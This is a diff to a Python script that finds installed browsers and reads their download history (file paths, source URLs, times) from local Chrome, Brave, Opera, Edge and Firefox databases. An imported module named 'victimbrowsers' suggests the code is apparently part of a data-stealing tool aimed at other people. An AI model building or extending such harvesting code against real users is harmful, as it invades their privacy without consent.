@@ -3,10 +3,11 @@ import shutil
 import sqlite3
 import base64
 from datetime import datetime, timedelta
+from victimbrowsers import navegadores_instalados  
 
 class BrowserDownloadsExtractor:
     def __init__(self, browser_name: str):
-        self.browser_name = browser_name
+        self.browser_name = browser_name.lower()
         self.browser_path = self.get_browser_path()
 
     def get_browser_path(self) -> str:
@@ -17,10 +18,10 @@ class BrowserDownloadsExtractor:
             "edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
             "firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
         }
-        return paths.get(self.browser_name.lower(), "")
+        return paths.get(self.browser_name, "")
 
     def get_chromium_downloads(self) -> list[tuple[str, str, str, str]]:
-        download_file_paths = list()
+        download_file_paths = []
 
         for root, _, files in os.walk(self.browser_path):
             for file in files:
@@ -48,7 +49,6 @@ class BrowserDownloadsExtractor:
             cursor = db.cursor()
 
             try:
-                # Consultando downloads
                 results = cursor.execute(
                     "SELECT target_path, tab_url, start_time, received_bytes FROM downloads"
                 ).fetchall()
@@ -102,7 +102,7 @@ class BrowserDownloadsExtractor:
                         for content, url, dateAdded in results:
                             dateAdded = self.firefox_time_to_datetime(dateAdded)
                             if content and url and dateAdded:
-                                download_entries.append((content, url, dateAdded, None))  # Firefox doesn't store received bytes in this table
+                                download_entries.append((content, url, dateAdded, None))
 
                         download_entries.sort(key=lambda x: x[2], reverse=True)
 
@@ -144,11 +144,21 @@ class BrowserDownloadsExtractor:
             print(f"Navegador {self.browser_name} não suportado.")
             return []
 
-
 if __name__ == "__main__":
-    browsers = ["chrome", "brave", "opera", "edge", "firefox"]
+    navegadores_suportados = navegadores_instalados()
+    
+    # tem que alterar os nomes retornados para que o extractor encontre, 3 horas até descobrir essa merda
+    navegador_map = {
+        'Chrome': 'chrome',
+        'Firefox': 'firefox',
+        'Edge': 'edge',
+        'Opera': 'opera',
+        'Brave': 'brave'
+    }
 
-    for browser in browsers:
+    navegadores_convertidos = [navegador_map[n] for n in navegadores_suportados if n in navegador_map]
+
+    for browser in navegadores_convertidos:
         extractor = BrowserDownloadsExtractor(browser)
         downloads = extractor.get_downloads()
 
